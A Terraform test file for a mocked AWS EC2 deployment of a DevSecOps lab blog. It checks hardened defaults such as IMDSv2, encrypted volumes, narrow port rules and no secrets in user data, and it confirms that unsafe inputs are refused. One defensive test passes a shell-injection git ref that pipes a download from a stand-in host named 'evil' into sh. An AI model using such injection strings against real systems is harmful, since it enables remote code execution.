# PostureBlogging EC2 — offline tests. No AWS account, no credentials, no cost.
#
#   cd deploy/aws-ec2 && terraform init -backend=false && terraform test
#
# The AWS provider is MOCKED: this proves the configuration (ports, metadata,
# encryption, user data), not that AWS accepts it or that the app boots there.

mock_provider "aws" {
  mock_resource "aws_iam_role" {
    defaults = { arn = "arn:aws:iam::111122223333:role/postureblog-ec2-mock" }
  }
}

override_data {
  target = data.aws_ssm_parameter.ubuntu[0]
  values = { value = "ami-0123456789abcdef0" }
}
override_data {
  target = data.aws_vpc.default[0]
  values = { id = "vpc-0mock" }
}
override_data {
  target = data.aws_subnets.default[0]
  values = { ids = ["subnet-0bbb", "subnet-0aaa"] }
}
override_data {
  target = data.aws_subnet.selected
  values = { id = "subnet-0aaa", vpc_id = "vpc-0mock" }
}

# Every variable a local terraform.tfvars might set is pinned here: test-file
# variables override tfvars, so a real run's tfvars (e.g. the lab's
# allow_http_from_anywhere = true) cannot change what these tests prove.
variables {
  allowed_account_id       = "111122223333" # AWS documentation placeholder
  owner                    = "student1"
  aws_region               = "us-east-1"
  environment              = "lab"
  instance_type            = "t3.small"
  http_ingress_cidrs       = ["203.0.113.10/32"] # RFC 5737 documentation address
  allow_http_from_anywhere = false
  ssh_ingress_cidrs        = []
  key_name                 = null
  enable_ssm               = true
}

run "secure_defaults" {
  command = apply

  assert {
    condition     = aws_instance.app.metadata_options[0].http_tokens == "required" && aws_instance.app.metadata_options[0].http_put_response_hop_limit == 1
    error_message = "IMDSv2 only, hop limit 1 (containers cannot reach the metadata service)."
  }
  assert {
    condition     = aws_instance.app.root_block_device[0].encrypted == true && aws_instance.app.root_block_device[0].volume_type == "gp3"
    error_message = "The root volume must be encrypted gp3."
  }
  assert {
    condition     = aws_instance.app.ami == "ami-0123456789abcdef0" && aws_instance.app.instance_type == "t3.small"
    error_message = "Ubuntu AMI from the SSM parameter, t3.small by default."
  }
  assert {
    condition     = aws_instance.app.credit_specification[0].cpu_credits == "standard"
    error_message = "No 'unlimited' CPU-credit surcharges."
  }
  assert {
    condition     = length(aws_vpc_security_group_ingress_rule.http) == 1 && aws_vpc_security_group_ingress_rule.http["203.0.113.10/32"].from_port == 80 && aws_vpc_security_group_ingress_rule.http["203.0.113.10/32"].to_port == 80
    error_message = "Inbound: port 80 from the approved CIDR only."
  }
  assert {
    condition     = length(aws_vpc_security_group_ingress_rule.ssh) == 0 && var.key_name == null # (key_name is computed: the mock invents one)
    error_message = "No SSH rule and no key pair by default."
  }
  assert {
    condition     = length(aws_iam_instance_profile.ssm) == 1 && aws_iam_role_policy_attachment.ssm[0].policy_arn == "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
    error_message = "Session Manager instead of SSH, with AWS's managed SSM policy only."
  }
  assert {
    condition     = aws_instance.app.subnet_id == "subnet-0aaa" && aws_instance.app.associate_public_ip_address == true
    error_message = "First default-VPC subnet (sorted), with a public IP."
  }
}

run "nothing_but_80_and_optional_22_is_ever_opened" {
  command = plan
  variables {
    ssh_ingress_cidrs = ["198.51.100.7/32"]
    key_name          = "lab-key"
  }
  assert {
    condition = alltrue(concat(
      [for r in aws_vpc_security_group_ingress_rule.http : r.from_port == 80 && r.to_port == 80],
      [for r in aws_vpc_security_group_ingress_rule.ssh : r.from_port == 22 && r.to_port == 22 && r.cidr_ipv4 == "198.51.100.7/32"],
    ))
    error_message = "Only 80 (approved CIDRs) and 22 (narrow operator CIDR) may be open; never 5432/5000/55900."
  }
  assert {
    condition     = aws_instance.app.key_name == "lab-key"
    error_message = "SSH needs the named key pair."
  }
}

run "user_data_deploys_the_pinned_commit_with_no_secret" {
  command = plan

  assert {
    condition     = strcontains(aws_instance.app.user_data, "GIT_REF='73922b03c6b746f1b39ef10d12ccca2cf50bfbd5'")
    error_message = "The instance deploys the pinned, tested commit."
  }
  assert {
    condition     = strcontains(aws_instance.app.user_data, "REPO_URL='https://github.com/Posture-Cybersecurity/PostureSec-DevSecOps-Lab.git'")
    error_message = "The public lab repository, over https, with no credentials."
  }
  assert {
    condition = (
      !strcontains(aws_instance.app.user_data, "posturesec_pass_2026") &&
      !can(regex("POSTGRES_PASSWORD=[A-Za-z0-9]", aws_instance.app.user_data))
    )
    error_message = "No database password in user data: it is generated on the instance."
  }
  assert {
    condition     = strcontains(base64decode(regex("COMPOSE_OVERRIDE_B64='([^']+)'", aws_instance.app.user_data)[0]), "ports: !reset []")
    error_message = "The shipped Compose override must unpublish PostgreSQL."
  }
  # 2026-10-20 incident: a Windows checkout gave CRLF and bash died at line 15.
  assert {
    condition = (
      !strcontains(aws_instance.app.user_data, "\r") &&
      !strcontains(base64decode(regex("COMPOSE_OVERRIDE_B64='([^']+)'", aws_instance.app.user_data)[0]), "\r")
    )
    error_message = "User data and the Compose override must reach the instance with LF line endings, even from a CRLF checkout."
  }
  assert {
    condition     = aws_instance.app.user_data_replace_on_change == true
    error_message = "Changing the commit or bootstrap replaces the instance instead of drifting."
  }
}

run "refuses_ssh_from_anywhere" {
  command = plan
  variables { ssh_ingress_cidrs = ["0.0.0.0/0"] }
  expect_failures = [var.ssh_ingress_cidrs]
}

run "refuses_wide_ssh" {
  command = plan
  variables { ssh_ingress_cidrs = ["198.51.0.0/16"] }
  expect_failures = [var.ssh_ingress_cidrs]
}

run "refuses_ssh_without_a_key" {
  command = plan
  variables { ssh_ingress_cidrs = ["198.51.100.7/32"] }
  expect_failures = [aws_security_group.app]
}

run "refuses_public_http_without_explicit_opt_in" {
  command = plan
  variables { http_ingress_cidrs = ["0.0.0.0/0"] }
  expect_failures = [aws_security_group.app]
}

run "public_http_only_with_explicit_opt_in" {
  command = plan
  variables {
    http_ingress_cidrs       = ["0.0.0.0/0"]
    allow_http_from_anywhere = true
  }
  assert {
    condition     = aws_vpc_security_group_ingress_rule.http["0.0.0.0/0"].from_port == 80
    error_message = "With the explicit opt-in, port 80 (and only 80) is public."
  }
}

run "refuses_a_shell_unsafe_git_ref" {
  command = plan
  variables { app_git_ref = "main'; curl evil | sh; '" }
  expect_failures = [var.app_git_ref]
}

run "refuses_a_credential_in_the_repo_url" {
  command = plan
  variables { app_repo_url = "https://user:token@github.com/org/repo.git" }
  expect_failures = [var.app_repo_url]
}

run "refuses_production_and_arm" {
  command = plan
  variables {
    environment   = "production"
    instance_type = "t4g.small"
  }
  expect_failures = [var.environment, var.instance_type]
}

run "refuses_a_malformed_account_id" {
  command = plan
  variables { allowed_account_id = "12345" }
  expect_failures = [var.allowed_account_id]
}
